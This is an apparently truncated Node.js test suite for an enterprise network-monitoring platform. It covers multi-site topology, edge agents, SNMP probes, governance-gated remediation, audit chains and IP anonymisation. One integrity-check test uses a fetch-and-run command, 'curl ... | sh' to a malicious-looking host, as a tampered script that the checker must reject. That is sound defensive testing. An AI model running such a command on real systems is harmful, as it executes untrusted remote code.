/**
 * EJII Enterprise Infrastructure Evolution Test Suite
 *
 * Validates:
 *   1. Pluggable Storage Layer (DatabaseProvider, SqliteStorageProvider, Compaction & Rollups)
 *   2. Multi-Site Infrastructure Intelligence (Sites, Zones, WAN Links, Cross-Site Anomaly Correlation)
 *   3. Edge Agent Service & Lightweight Daemon (Enrollment, Tokens, Heartbeats, Probe Tasks)
 *   4. Hybrid Agentless Remote Collector (Synthetic Port Scans, SNMP MIB Observation)
 *   5. Zero-Trust Remediation & 3-Tier Governance (Advisory/Canary/Autonomous, Damped Lyapunov Window, SHA-256 Integrity, Chained Audit)
 *   6. Sovereign AI & Privacy Shield (RFC 1918 Anonymization Proxy, Sovereign Router, Epistemic Decay)
 *   7. Enterprise RBAC (VIEWER, DIAGNOSTICIAN, ADMIN_OPERATOR)
 *   8. Enterprise REST Endpoints (/api/enterprise/*)
 *   9. ChatOperator Multi-Site Conversational Intelligence
 */

'use strict';

const { describe, it, before, after } = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');

const { app } = require('../src/server');
const { databaseProvider, SqliteStorageProvider } = require('../src/core/storage/database-provider');
const { multiSiteManager } = require('../src/core/multisite/multisite-manager');
const { edgeAgentService } = require('../src/core/agent/edge-agent-service');
const { EdgeAgentDaemon } = require('../src/core/agent/edge-agent-daemon');
const { agentlessCollector } = require('../src/core/agent/agentless-collector');
const { remediationGovernanceEngine, GOVERNANCE_MODES } = require('../src/core/governance/remediation-governance');
const { privacyShield } = require('../src/core/privacy/privacy-shield');
const { ROLES, ROLE_CAPABILITIES, hasPermission, generateToken } = require('../src/core/security');
const { chatOperatorService } = require('../src/core/chat/chat-operator-service');

describe('EJII Enterprise Infrastructure Evolution Suite', () => {
  let testServer = null;

  before(async () => {
    await new Promise((resolve) => {
      testServer = http.createServer(app);
      testServer.listen(3000, '127.0.0.1', () => {
        resolve();
      });
      testServer.on('error', (err) => {
        if (err.code === 'EADDRINUSE') {
          testServer = null;
          resolve();
        }
      });
    });
  });

  after(async () => {
    if (testServer) {
      await new Promise((resolve) => testServer.close(resolve));
    }
  });

  describe('1. Pluggable Storage Layer & Telemetry Compaction', () => {
    it('initializes SqliteStorageProvider with WAL mode and health status', () => {
      const health = databaseProvider.getStorageHealth();
      assert.ok(health);
      assert.equal(health.provider, 'sqlite');
      assert.equal(health.status, 'HEALTHY');
      assert.equal(health.mode, 'WAL');
      assert.ok(typeof health.totalTelemetryRecords === 'number');
    });

    it('records raw telemetry samples and queries them back', () => {
      const targetId = 'test-node-compaction-01';
      const recRes = databaseProvider.recordMetric('latency_ms', targetId, 18.5, 'ms', { status: 'healthy' });
      assert.ok(recRes.success);

      const records = databaseProvider.queryTelemetry('latency_ms', targetId, new Date(Date.now() - 60000), new Date());
      assert.ok(Array.isArray(records));
      assert.ok(records.length >= 1);
      assert.equal(records[records.length - 1].value, 18.5);
    });

    it('executes multi-tier telemetry compaction without throwing errors', () => {
      const compactionRes = databaseProvider.compactTelemetry({ rawRetentionDays: 30 });
      assert.ok(compactionRes.success);
      assert.ok(typeof compactionRes.durationMs === 'number');
      assert.ok(typeof compactionRes.rollupsCreated === 'number');
    });
  });

  describe('2. Multi-Site Infrastructure Intelligence', () => {
    it('loads canonical enterprise sites with zones and primary gateways', () => {
      const sites = multiSiteManager.getAllSites();
      assert.ok(Array.isArray(sites));
      assert.ok(sites.length >= 5);

      const lonHq = sites.find(s => s.code === 'LON-HQ');
      assert.ok(lonHq);
      assert.equal(lonHq.primaryGateway, '10.10.1.1');
      assert.ok(lonHq.zones.length >= 3);

      const fraDc = sites.find(s => s.code === 'FRA-DC');
      assert.ok(fraDc);
      assert.equal(fraDc.criticality, 'MISSION_CRITICAL');
    });

    it('loads inter-site WAN links connecting HQ, DC, and branch offices', () => {
      const links = multiSiteManager.getAllWanLinks();
      assert.ok(Array.isArray(links));
      assert.ok(links.length >= 4);

      const mplsLink = links.find(l => (l.source_site_id === 'site-hq-lon' && l.target_site_id === 'site-dc-fra') || (l.sourceSiteId === 'site-hq-lon'));
      assert.ok(mplsLink);
    });

    it('accurately resolves IP location to site and zone', () => {
      const loc1 = multiSiteManager.resolveIpLocation('10.10.10.45');
      assert.ok(loc1);
      assert.equal(loc1.site.code, 'LON-HQ');
      assert.equal(loc1.zone.vlan, 10);
      assert.equal(loc1.isGateway, false);

      const locGateway = multiSiteManager.resolveIpLocation('10.20.1.1');
      assert.ok(locGateway);
      assert.equal(locGateway.site.code, 'FRA-DC');
      assert.equal(locGateway.isGateway, true);
    });

    it('correlates cross-site incident: identifies isolated local VLAN', () => {
      const correlation = multiSiteManager.correlateMultiSiteIncident({
        targetIp: '10.10.20.55',
        reportedSymptoms: ['HIGH_LATENCY_ON_PORT_443']
      });
      assert.equal(correlation.correlationScope, 'LOCAL_VLAN_ISOLATED');
      assert.equal(correlation.site.code, 'LON-HQ');
      assert.ok(correlation.confidenceScore >= 0.9);
      assert.ok(correlation.blastRadius.otherVlansHealthy);
    });

    it('correlates cross-site incident: identifies site gateway border outage', () => {
      const correlation = multiSiteManager.correlateMultiSiteIncident({
        targetIp: '10.10.1.1',
        reportedSymptoms: ['GATEWAY_UNRESPONSIVE']
      });
      assert.equal(correlation.correlationScope, 'SITE_GATEWAY_OUTAGE');
      assert.equal(correlation.site.code, 'LON-HQ');
      assert.ok(correlation.blastRadius.affectedVlans.length >= 3);
    });

    it('correlates cross-site incident: identifies shared central dependency in DC', () => {
      const correlation = multiSiteManager.correlateMultiSiteIncident({
        targetIp: '10.20.60.10', // Frankfurt Database Cluster
        reportedSymptoms: ['DB_TIMEOUT']
      });
      assert.equal(correlation.correlationScope, 'SHARED_UPSTREAM_DEPENDENCY');
      assert.equal(correlation.site.code, 'FRA-DC');
      assert.equal(correlation.blastRadius.tier, 'MISSION_CRITICAL');
    });

    it('correlates cross-site incident: flags unprobed node with UNVERIFIED_STATUS', () => {
      const correlation = multiSiteManager.correlateMultiSiteIncident({
        targetIp: '10.50.30.12',
        telemetrySnapshot: { unprobed: true }
      });
      assert.equal(correlation.correlationScope, 'UNVERIFIED_STATUS');
      assert.equal(correlation.telemetryStatus, 'UNPROBED');
      assert.equal(correlation.site.code, 'SIN-BR');
    });

    it('generates multi-site fleet overview summary', () => {
      const overview = multiSiteManager.generateMultiSiteFleetOverview();
      assert.ok(overview.fleetSummary);
      assert.equal(overview.fleetSummary.totalSites, 5);
      assert.ok(overview.fleetSummary.totalZones >= 10);
    });
  });

  describe('3. Lightweight Edge Agent Service & Daemon', () => {
    it('returns seeded default edge observation agents', () => {
      const agents = edgeAgentService.getAllAgents();
      assert.ok(Array.isArray(agents));
      assert.ok(agents.length >= 3);

      const lonAgent = agents.find(a => a.id === 'agent-lon-01');
      assert.ok(lonAgent);
      assert.equal(lonAgent.status, 'ONLINE');
      assert.ok(lonAgent.observedSubnets.includes('10.10.10.0/24'));
    });

    it('enrolls a new edge agent and generates secret key', () => {
      const enrollRes = edgeAgentService.enrollAgent({
        name: 'Tokyo Branch Edge Collector',
        siteId: 'site-br-tyo',
        hostname: 'tyo-probe-01.apac.corp',
        platform: 'linux',
        ipAddress: '10.40.200.12',
        observedSubnets: ['10.40.200.0/24', '10.40.210.0/24']
      });
      assert.ok(enrollRes.success);
      assert.ok(enrollRes.agentId);
      assert.ok(enrollRes.secretKey);

      // Verify agent authentication with generated key
      const isAuthValid = edgeAgentService.verifyAgentAuth(enrollRes.agentId, enrollRes.secretKey);
      assert.equal(isAuthValid, true);

      // Verify wrong secret fails
      const isWrongAuth = edgeAgentService.verifyAgentAuth(enrollRes.agentId, 'wrong_key');
      assert.equal(isWrongAuth, false);
    });

    it('processes heartbeat and dispatches & completes probe task', () => {
      const agents = edgeAgentService.getAllAgents();
      const testAgent = agents[0];

      // Dispatch task to agent
      const taskRes = edgeAgentService.dispatchProbeTask({
        agentId: testAgent.id,
        taskType: 'probe_tcp',
        target: '127.0.0.1',
        port: 3000
      });
      assert.ok(taskRes.success);
      assert.ok(taskRes.taskId);

      // Agent heartbeat should pick up the pending task
      const hbRes = edgeAgentService.processHeartbeat(testAgent.id, { cpuPct: 12, memMb: 140 });
      assert.ok(hbRes.acknowledged);
      assert.ok(hbRes.assignedTasks.some(t => t.taskId === taskRes.taskId));

      // Agent submits task execution result
      const submitRes = edgeAgentService.submitTaskResult(taskRes.taskId, testAgent.id, {
        open: true,
        latencyMs: 1.2,
        status: 'OPEN'
      });
      assert.ok(submitRes.success);
      assert.equal(submitRes.status, 'COMPLETED');
    });

    it('EdgeAgentDaemon executes local synthetic TCP and DNS probes', async () => {
      const daemon = new EdgeAgentDaemon({ agentId: 'agent-lon-01' });
      const tcpProbe = await daemon.executeProbe('probe_tcp', '127.0.0.1', 3000, { timeoutMs: 1000 });
      assert.ok(tcpProbe);
      assert.equal(tcpProbe.probeType, 'TCP');
      assert.ok(typeof tcpProbe.durationMs === 'number');

      const dnsProbe = await daemon.executeProbe('probe_dns', 'localhost');
      assert.ok(dnsProbe);
      assert.equal(dnsProbe.probeType, 'DNS');

      const pingProbe = await daemon.executeProbe('probe_ping', '127.0.0.1', 3000, { timeoutMs: 1000 });
      assert.ok(pingProbe);
      assert.equal(pingProbe.probeType, 'PING');
      assert.equal(pingProbe.success, true);
    });
  });

  describe('4. Hybrid Agentless Remote Collector', () => {
    it('probes management ports on target host and computes reachability score', async () => {
      const probeRes = await agentlessCollector.probeTargetPorts('127.0.0.1', [3000, 3001, 80], 500);
      assert.ok(probeRes);
      assert.equal(probeRes.collectionType, 'AGENTLESS_TCP_SYNTHETIC');
      assert.ok(typeof probeRes.reachabilityScore === 'number');
      assert.ok(probeRes.ports.length === 3);
    });

    it('abstracts remote SNMP device telemetry queries with scrubbed credentials', () => {
      const snmpData = agentlessCollector.querySnmpDevice('10.10.1.1');
      assert.ok(snmpData);
      assert.equal(snmpData.collectionType, 'AGENTLESS_SNMP');
      assert.equal(snmpData.communityScrubbed, '***');
      assert.ok(snmpData.ifTable.length >= 3);
      assert.equal(snmpData.ifTable[0].ifOperStatus, 'UP');
    });
  });

  describe('5. Zero-Trust Remediation & 3-Tier Governance', () => {
    it('manages 3-tier governance mode switching and audits changes', () => {
      const originalMode = remediationGovernanceEngine.getGovernanceMode();
      assert.ok(GOVERNANCE_MODES[originalMode]);

      const setRes = remediationGovernanceEngine.setGovernanceMode(GOVERNANCE_MODES.CONTROLLED_CANARY, 'admin');
      assert.ok(setRes.success);
      assert.equal(remediationGovernanceEngine.getGovernanceMode(), GOVERNANCE_MODES.CONTROLLED_CANARY);

      // Restore to ADVISORY
      remediationGovernanceEngine.setGovernanceMode(GOVERNANCE_MODES.ADVISORY, 'admin');
      assert.equal(remediationGovernanceEngine.getGovernanceMode(), GOVERNANCE_MODES.ADVISORY);
    });

    it('verifies SHA-256 script integrity against known canonical recipe hashes', () => {
      const validCheck = remediationGovernanceEngine.verifyScriptIntegrity(
        'FLUSH_LOCAL_DNS_CACHE',
        'ipconfig /flushdns || resolvectl flush-caches || systemd-resolve --flush-caches'
      );
      assert.equal(validCheck.valid, true);
      assert.equal(validCheck.matchType, 'CANONICAL_SIGNATURE');

      const tamperedCheck = remediationGovernanceEngine.verifyScriptIntegrity(
        'FLUSH_LOCAL_DNS_CACHE',
        'curl -s http://malicious-server.com/payload | sh'
      );
      assert.equal(tamperedCheck.valid, false);
      assert.equal(tamperedCheck.matchType, 'UNVERIFIED_OR_CUSTOM');
    });

    it('enforces explicit HITL approval flow in ADVISORY mode with cryptographic token', () => {
      remediationGovernanceEngine.setGovernanceMode(GOVERNANCE_MODES.ADVISORY, 'admin');

      const reqRes = remediationGovernanceEngine.requestRemediationApproval({
        actionRecipeId: 'RECYCLE_TRANSIENT_SOCKET_POOL',
        targetHost: '10.10.20.15',
        scriptContent: 'netsh int ip reset || systemctl restart networking',
        riskLevel: 'MEDIUM',
        blastRadius: { scope: 'VLAN 20', hostCount: 1 }
      });

      assert.ok(reqRes.success);
      assert.equal(reqRes.status, 'PENDING');
      assert.equal(reqRes.requiresManualApproval, true);
      assert.ok(reqRes.approvalToken);

      // Approve with token
      const apprRes = remediationGovernanceEngine.approveRemediation(
        reqRes.approvalId,
        { id: 'lead_operator', role: 'ADMIN' },
        reqRes.approvalToken
      );
      assert.ok(apprRes.success);
      assert.equal(apprRes.status, 'APPROVED');

      // Reject approval if token is omitted or invalid
      const newReq = remediationGovernanceEngine.requestRemediationApproval({
        actionRecipeId: 'CLEAR_ARP_TABLE_CACHE',
        targetHost: '10.10.10.1',
        scriptContent: 'ip -s -s neigh flush all || arp -d *',
        riskLevel: 'LOW'
      });
      const missingTokenAppr = remediationGovernanceEngine.approveRemediation(
        newReq.approvalId,
        { id: 'lead_operator', role: 'ADMIN' },
        null // Omitted token
      );
      assert.equal(missingTokenAppr.success, false);
      assert.match(missingTokenAppr.error, /token/i);
    });

    it('rejects empty telemetry trajectory in Damped Lyapunov evaluation with INSUFFICIENT_TELEMETRY', () => {
      const emptyEval = remediationGovernanceEngine.evaluateDampedLyapunovStability({ latencyMs: 20 }, []);
      assert.equal(emptyEval.stable, false);
      assert.equal(emptyEval.verdict, 'INSUFFICIENT_TELEMETRY_UNKNOWN');
    });

    it('evaluates Damped Lyapunov stability window: absorbs restart spike and converges', () => {
      const baseline = { latencyMs: 25, packetLossPct: 0, cpuPct: 15 };

      // Telemetry trajectory with initial restart spike at t=5s, damping window=15s, then smooth convergence
      const trajectory = [
        { tSec: 2, latencyMs: 85, packetLossPct: 2.0, cpuPct: 65 },  // Spike during grace period
        { tSec: 8, latencyMs: 120, packetLossPct: 5.0, cpuPct: 80 }, // Spike during grace period
        { tSec: 16, latencyMs: 30, packetLossPct: 0.0, cpuPct: 22 }, // Settled
        { tSec: 20, latencyMs: 24, packetLossPct: 0.0, cpuPct: 16 }  // Healthy steady state
      ];

      const lyapEval = remediationGovernanceEngine.evaluateDampedLyapunovStability(baseline, trajectory, 15);
      assert.ok(lyapEval.stable);
      assert.equal(lyapEval.verdict, 'STABLE_CONVERGENCE');
      assert.ok(lyapEval.restartSpikesAbsorbed >= 2);
      assert.ok(lyapEval.energyDecaying);
    });

    it('maintains a cryptographically chained tamper-evident audit ledger', () => {
      // Record test entries
      remediationGovernanceEngine.recordAuditEntry({
        actionId: 'TEST_AUDIT_01',
        userId: 'admin',
        actionType: 'GOVERNANCE_TEST_EVENT',
        target: '10.10.1.1',
        scriptSha256: 'abc123hash',
        status: 'SUCCESS',
        details: { test: true }
      });

      const verification = remediationGovernanceEngine.verifyAuditChainIntegrity();
      assert.ok(verification.valid);
      assert.equal(verification.status, 'CHAIN_INTEGRITY_VERIFIED');
      assert.ok(verification.totalRecords >= 1);
    });
  });

  describe('6. Sovereign AI & Privacy Shield', () => {
    it('correctly identifies RFC 1918 private IPv4 ranges', () => {
      assert.equal(privacyShield.isPrivateRfc1918('10.0.1.15'), true);
      assert.equal(privacyShield.isPrivateRfc1918('172.16.5.100'), true);
      assert.equal(privacyShield.isPrivateRfc1918('172.31.255.1'), true);
      assert.equal(privacyShield.isPrivateRfc1918('192.168.1.1'), true);

      // Public or loopback IPs
      assert.equal(privacyShield.isPrivateRfc1918('8.8.8.8'), false);
      assert.equal(privacyShield.isPrivateRfc1918('1.1.1.1'), false);
      assert.equal(privacyShield.isPrivateRfc1918('127.0.0.1'), false);
    });

    it('bidirectionally sanitizes and deanonymizes private IPs, MACs, and internal domains', () => {
      const sessionId = 'test-session-privacy-42';
      const rawPrompt = 'Investigate packet loss on host 10.10.20.15 (MAC aa:bb:cc:dd:ee:ff, hostname switch-01.corp) with Bearer mysecrettoken123';

      const sanitized = privacyShield.sanitizeForCloudLlm(rawPrompt, sessionId);
      assert.ok(!sanitized.sanitizedText.includes('10.10.20.15'));
      assert.ok(!sanitized.sanitizedText.includes('aa:bb:cc:dd:ee:ff'));
      assert.ok(!sanitized.sanitizedText.includes('switch-01.corp'));
      assert.ok(!sanitized.sanitizedText.includes('mysecrettoken123'));
      assert.ok(sanitized.sanitizedText.includes('IP_MASK_'));
      assert.ok(sanitized.sanitizedText.includes('MAC_MASK_'));
      assert.ok(sanitized.sanitizedText.includes('HOST_MASK_'));

      // Simulate external cloud LLM response containing the masked tokens
      const mockLlmResponse = `Analysis complete: Host IP_MASK_01 with MAC MAC_MASK_01 on HOST_MASK_01 is experiencing buffer overflow.`;

      // Deanonymize back for NOC operator display
      const restored = privacyShield.deanonymizeFromCloudLlm(mockLlmResponse, sessionId);
      assert.ok(restored.includes('10.10.20.15'));
      assert.ok(restored.includes('aa:bb:cc:dd:ee:ff'));
      assert.ok(restored.includes('switch-01.corp'));
    });

    it('computes epistemic confidence time-decay according to domain half-life', () => {
      // ARP entry 15 minutes old (half-life = 5 min -> should be decayed by factor of 2^3 = 8)
      const fifteenMinAgo = new Date(Date.now() - 15 * 60000).toISOString();
      const arpDecay = privacyShield.computeConfidenceDecay(1.0, fifteenMinAgo, 'ARP_ENTRY');
      assert.ok(arpDecay.decayedConfidence <= 0.15);
      assert.equal(arpDecay.isStale, true);

      // Switch port topology 1 hour old (half-life = 24 hours -> should remain highly confident)
      const oneHourAgo = new Date(Date.now() - 60 * 60000).toISOString();
      const topoDecay = privacyShield.computeConfidenceDecay(1.0, oneHourAgo, 'SWITCH_PORT_TOPOLOGY');
      assert.ok(topoDecay.decayedConfidence >= 0.95);
      assert.equal(topoDecay.isStale, false);
    });

    it('routes sovereign inference to deterministic offline engine when cloud is isolated', async () => {
      const routeRes = await privacyShield.routeSovereignInference('Analyze core switch flap');
      assert.ok(routeRes.provider);
      assert.ok(routeRes.status);
    });
  });

  describe('7. Enterprise RBAC Roles & Permissions', () => {
    it('verifies VIEWER, DIAGNOSTICIAN, and ADMIN_OPERATOR permissions', () => {
      assert.ok(ROLES.VIEWER);
      assert.ok(ROLES.DIAGNOSTICIAN);
      assert.ok(ROLES.ADMIN_OPERATOR);

      // VIEWER can read telemetry but not execute active diagnostics or remediation
      assert.equal(hasPermission(ROLES.VIEWER, 'telemetry.read'), true);
      assert.equal(hasPermission(ROLES.VIEWER, 'network.diagnostics.execute'), false);
      assert.equal(hasPermission(ROLES.VIEWER, 'host.remediation.execute'), false);

      // DIAGNOSTICIAN can execute diagnostics and packet captures, but not host remediation
      assert.equal(hasPermission(ROLES.DIAGNOSTICIAN, 'network.diagnostics.execute'), true);
      assert.equal(hasPermission(ROLES.DIAGNOSTICIAN, 'network.capture.execute'), true);
      assert.equal(hasPermission(ROLES.DIAGNOSTICIAN, 'host.remediation.execute'), false);

      // ADMIN_OPERATOR has full capabilities
      assert.equal(hasPermission(ROLES.ADMIN_OPERATOR, 'system.config.manage'), true);
      assert.equal(hasPermission(ROLES.ADMIN_OPERATOR, 'host.remediation.execute'), true);
      assert.equal(hasPermission(ROLES.ADMIN_OPERATOR, 'network.diagnostics.execute'), true);
    });
  });

  describe('8. Enterprise REST APIs (/api/enterprise/*)', () => {
    function apiGet(urlPath) {
      return new Promise((resolve, reject) => {
        const req = http.get({
          hostname: '127.0.0.1',
          port: 3000,
          path: urlPath,
          headers: { 'Accept': 'application/json' }
        }, (res) => {
          let data = '';
          res.on('data', chunk => { data += chunk; });
          res.on('end', () => {
            try {
              resolve({ status: res.statusCode, data: JSON.parse(data) });
            } catch (_) {
              resolve({ status: res.statusCode, raw: data });
            }
          });
        });
        req.on('error', reject);
      });
    }

    it('GET /api/enterprise/status returns deployment mode and fleet summary', async () => {
      const res = await apiGet('/api/enterprise/status');
      assert.equal(res.status, 200);
      assert.ok(res.data.success);
      assert.ok(res.data.deploymentMode);
      assert.ok(res.data.fleetSummary);
      assert.ok(typeof res.data.activeAgentsCount === 'number');
    });

    it('GET /api/enterprise/sites returns all 5 enterprise sites and WAN links', async () => {
      const res = await apiGet('/api/enterprise/sites');
      assert.equal(res.status, 200);
      assert.ok(res.data.success);
      assert.ok(res.data.sites.length >= 5);
      assert.ok(res.data.wanLinks.length >= 4);
    });

    it('GET /api/enterprise/agents returns enrolled edge agents', async () => {
      const res = await apiGet('/api/enterprise/agents');
      assert.equal(res.status, 200);
      assert.ok(res.data.success);
      assert.ok(res.data.agents.length >= 3);
    });

    it('GET /api/enterprise/storage/health returns SQLite WAL statistics', async () => {
      const res = await apiGet('/api/enterprise/storage/health');
      assert.equal(res.status, 200);
      assert.ok(res.data.success);
      assert.equal(res.data.health.status, 'HEALTHY');
      assert.equal(res.data.health.mode, 'WAL');
    });

    it('GET /api/enterprise/governance/audit returns verified audit chain', async () => {
      const res = await apiGet('/api/enterprise/governance/audit?limit=10');
      assert.equal(res.status, 200);
      assert.ok(res.data.success);
      assert.ok(res.data.verification.valid);
    });
  });

  describe('9. Natural Language Multi-Site Conversational Operator', () => {
    it('answers multi-site status questions with exact enterprise topology details', async () => {
      const session = chatOperatorService.getOrCreateSession('test-multisite-session-01', {
        id: 'admin-user',
        username: 'admin',
        role: 'ADMIN'
      });

      const turn = await chatOperatorService.processTurn(
        session,
        'Which sites or branch offices are affected across our infrastructure?',
        { id: 'admin-user', username: 'admin', role: 'ADMIN' }
      );

      assert.ok(turn.success);
      assert.equal(turn.status, 'ok');
      assert.ok(turn.data.reply.includes('LON-HQ') || turn.data.reply.includes('Multi-Site'));
      assert.ok(turn.data.reply.includes('London Global Headquarters') || turn.data.reply.includes('Enterprise Sites'));
      assert.ok(turn.data.structuredAnswer.result.includes('Multi-Site Fleet Intelligence'));
    });
  });

  describe('10. Autonomous Operations, Real SNMP, ICMP Echo & Task Lease Resilience', () => {
    it('executes real SNMP UDP probe and returns honest UNREACHABLE_TIMEOUT for offline device', async () => {
      // Query an unassigned local port 16199 or unreachable IP to verify genuine UDP socket behavior
      const snmpRes = await agentlessCollector.probeLiveSnmpDevice('127.0.0.1', 'public', {
        port: 16199,
        timeoutMs: 400,
        retries: 0
      });
      assert.ok(snmpRes);
      assert.equal(snmpRes.reachable, false);
      assert.equal(snmpRes.collectionType, 'AGENTLESS_SNMP');
      assert.equal(snmpRes.fidelity, 'LIVE_UDP_SNMP');
      assert.equal(snmpRes.communityScrubbed, '***');
      assert.ok(snmpRes.status === 'UNREACHABLE_TIMEOUT' || snmpRes.status === 'SNMP_PROBE_FAILED');
      assert.deepEqual(snmpRes.ifTable, []);
    });

    it('EdgeAgentDaemon executes real ICMP Echo probe with fidelity REAL_OS_ICMP_ECHO', async () => {
      const daemon = new EdgeAgentDaemon({ agentId: 'agent-lon-01' });
      const pingRes = await daemon.executeProbe('probe_ping', '127.0.0.1', null, { count: 2, timeoutMs: 1000 });
      assert.ok(pingRes);
      assert.equal(pingRes.probeType, 'PING');
      assert.equal(pingRes.protocol, 'ICMP');
      assert.equal(pingRes.fidelity, 'REAL_OS_ICMP_ECHO');
      assert.equal(pingRes.success, true);
      assert.ok(typeof pingRes.packetsSent === 'number');
      assert.ok(typeof pingRes.packetsReceived === 'number');
      assert.ok(pingRes.status === 'HEALTHY' || pingRes.status === 'REACHABLE');
    });

    it('EdgeAgentDaemon buffers task results offline and flushes when connectivity is restored', async () => {
      const daemon = new EdgeAgentDaemon({
        agentId: 'agent-lon-01',
        serverUrl: 'http://127.0.0.1:59999' // Intentionally offline mock port
      });

      const submitRes = await daemon.submitTaskResult('task-offline-test-1', {
        status: 'OPEN',
        latencyMs: 12.3
      });

      assert.equal(submitRes.success, false);
      assert.equal(submitRes.queuedForRetry, true);
      assert.equal(daemon.pendingResultQueue.length, 1);
      assert.equal(daemon.pendingResultQueue[0].taskId, 'task-offline-test-1');

      // Now point back to live server
      daemon.serverUrl = 'http://127.0.0.1:3000';
      // Flush queue (even if task id is unknown on server, queue is drained)
      const flushRes = await daemon.flushPendingResults();
      assert.ok(typeof flushRes.flushed === 'number');
    });

    it('reaps stale dispatched agent tasks and transitions to TIMEOUT_FAILED after 3 retries', () => {
      const agent = edgeAgentService.getAllAgents()[0];
      const task = edgeAgentService.dispatchProbeTask({
        agentId: agent.id,
        taskType: 'probe_tcp',
        target: '127.0.0.1',
        port: 3000
      });

      assert.ok(task.taskId);

      // Simulate heartbeat picking up the task
      const hb = edgeAgentService.processHeartbeat(agent.id);
      assert.ok(hb.acknowledged);

      // Artificially age the dispatched_at timestamp back 120 seconds
      const { db } = require('../src/db/database');
      const pastTime = new Date(Date.now() - 120000).toISOString();
      db.prepare("UPDATE enterprise_agent_tasks SET dispatched_at = ? WHERE id = ?").run(pastTime, task.taskId);

      // First reap: returns to PENDING with retry_count = 1
      const reap1 = edgeAgentService.reapStaleDispatchedTasks(60);
      assert.ok(reap1.retried >= 1);

      const taskRow1 = db.prepare("SELECT * FROM enterprise_agent_tasks WHERE id = ?").get(task.taskId);
      assert.equal(taskRow1.status, 'PENDING');
      assert.equal(taskRow1.retry_count, 1);

      // Set retry_count to 3 and age again
      db.prepare("UPDATE enterprise_agent_tasks SET status = 'DISPATCHED', dispatched_at = ?, retry_count = 3 WHERE id = ?").run(pastTime, task.taskId);

      // Second reap: transitions to TIMEOUT_FAILED
      const reap2 = edgeAgentService.reapStaleDispatchedTasks(60);
      assert.ok(reap2.failed >= 1);

      const taskRow2 = db.prepare("SELECT * FROM enterprise_agent_tasks WHERE id = ?").get(task.taskId);
      assert.equal(taskRow2.status, 'TIMEOUT_FAILED');
      assert.ok(taskRow2.result_json.includes('TASK_LEASE_EXPIRED'));
    });

    it('identifies simulation lab entities via is_sample_simulation flag', () => {
      const sites = multiSiteManager.getAllSites();
      assert.ok(sites.length >= 5);
      assert.ok(sites.every(s => typeof s.isSampleSimulation === 'boolean'));

      const agents = edgeAgentService.getAllAgents();
      assert.ok(agents.length >= 3);
      assert.ok(agents.every(a => typeof a.isSampleSimulation === 'boolean'));
    });

    it('enforces 3-tier governance gate on /api/diagnostics/remediation/execute in ADVISORY mode', async () => {
      remediationGovernanceEngine.setGovernanceMode('ADVISORY', 'admin');
      const adminToken = generateToken({ id: 'admin-1', username: 'admin', role: 'ADMIN' });

      const postRemediation = (body) => new Promise((resolve, reject) => {
        const payload = JSON.stringify(body);
        const req = http.request({
          hostname: '127.0.0.1',
          port: 3000,
          path: '/api/diagnostics/remediation/execute',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload),
            'Authorization': `Bearer ${adminToken}`
          }
        }, (res) => {
          let data = '';
          res.on('data', chunk => { data += chunk; });
          res.on('end', () => {
            try { resolve({ status: res.statusCode, data: JSON.parse(data) }); }
            catch (_) { resolve({ status: res.statusCode, data }); }
          });
        });
        req.on('error', reject);
        req.write(payload);
        req.end();
      });

      // 1. Without approval token, execution must be rejected with 403
      const blockedRes = await postRemediation({
        recipeId: 'flush_dns',
        targetHost: '127.0.0.1'
      });
      assert.equal(blockedRes.status, 403);
      assert.equal(blockedRes.data.success, false);
      assert.ok(blockedRes.data.error.includes('GOVERNANCE_GATE_BLOCKED'));

      // 2. Request approval from governance engine
      const apprReq = remediationGovernanceEngine.requestRemediationApproval({
        actionRecipeId: 'FLUSH_LOCAL_DNS_CACHE',
        targetHost: '127.0.0.1',
        scriptContent: 'ipconfig /flushdns || resolvectl flush-caches || systemd-resolve --flush-caches',
        riskLevel: 'LOW'
      });
      assert.ok(apprReq.approvalId);
      assert.ok(apprReq.approvalToken);

      // 3. Generate preview token and execute with approval credentials
      const { autonomousRemediationEngine } = require('../src/systems/remediation/autonomous-remediation-engine');
      const preview = await autonomousRemediationEngine.executePreview('flush_dns', {}, { role: 'ADMIN', username: 'admin', id: 'admin-1' });

      const allowedRes = await postRemediation({
        actionToken: preview.actionToken,
        approvalId: apprReq.approvalId,
        approvalToken: apprReq.approvalToken
      });
      assert.equal(allowedRes.status, 200);
      assert.equal(allowedRes.data.success, true);
    });

    it('enforces strict wildcard host 0.0.0.0 security separation from loopback in src/config.js', () => {
      const { isLocalLoopbackHost, isWildcardBindingHost, validateSecurityConfiguration } = require('../src/config');
      assert.equal(isLocalLoopbackHost('127.0.0.1'), true);
      assert.equal(isLocalLoopbackHost('localhost'), true);
      assert.equal(isLocalLoopbackHost('::1'), true);
      assert.equal(isLocalLoopbackHost('0.0.0.0'), false, '0.0.0.0 must never be classified as a local loopback address');
      assert.equal(isWildcardBindingHost('0.0.0.0'), true);

      assert.throws(() => {
        validateSecurityConfiguration({
          env: {
            NODE_ENV: 'development',
            EJII_HOST: '0.0.0.0',
            EJII_EVALUATION_MODE: 'true'
          }
        });
      }, /Cannot enable EJII_EVALUATION_MODE=true when bound to non-loopback interface/);
    });

    it('propagates leaseEpoch end-to-end in EdgeAgentDaemon and drops STALE_LEASE_EPOCH_IGNORED tasks from queue', async () => {
      const daemon = new EdgeAgentDaemon({ agentId: 'agent-lon-01' });
      daemon.clearDurableOutbox();

      // Simulate offline failure queuing a task with leaseEpoch: 1
      daemon._postTaskResult = async () => {
        throw new Error('ECONNREFUSED simulated offline control plane');
      };
      const queuedRes = await daemon.submitTaskResult('task-epoch-test-99', { status: 'OPEN' }, 1);
      assert.equal(queuedRes.queuedForRetry, true);
      assert.equal(daemon.pendingResultQueue.length, 1);
      assert.equal(daemon.pendingResultQueue[0].leaseEpoch, 1);

      // Now simulate control plane returning HTTP 409 STALE_LEASE_EPOCH_IGNORED during flush
      daemon._postTaskResult = async (taskId, result, leaseEpoch) => {
        assert.equal(taskId, 'task-epoch-test-99');
        assert.equal(leaseEpoch, 1);
        return {
          statusCode: 409,
          success: false,
          status: 'STALE_LEASE_EPOCH_IGNORED'
        };
      };
      const flushRes = await daemon.flushPendingResults();
      assert.equal(flushRes.droppedStale, 1);
      assert.equal(daemon.pendingResultQueue.length, 0, 'Stale lease epoch task must be removed from pendingResultQueue');
    });

    it('tags SNMP timeouts and multi-signal fallback profiles with explicit telemetryProvenance and isAuthoritativeSnmp flags', async () => {
